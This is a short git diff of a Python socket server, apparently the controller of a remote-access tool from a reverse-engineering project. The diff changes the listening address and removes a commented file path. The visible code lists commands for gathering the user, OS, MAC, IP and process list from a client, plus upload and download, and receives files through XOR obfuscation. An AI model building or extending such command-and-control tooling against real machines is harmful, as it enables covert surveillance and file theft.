@@ -1,6 +1,6 @@
 import socket
 
-ip = '127.0.0.1'
+ip = '192.168.159.129'
 port = 12345
 
 commands = ['exit', 'getUser', 'getOS', 'getMAC', 'getIP', 'getProc', 'download', 'upload']
@@ -38,7 +38,6 @@ def main():
 
         # Receive the file from client
         if command == "download":
-            #path = "C:/Users/mcraf/CLionProjects/Final_Reverse_Proj/download3.txt"
             path = input("Enter path: ")
             data = conn.recv(100000)
             filedata = xor(data.decode())
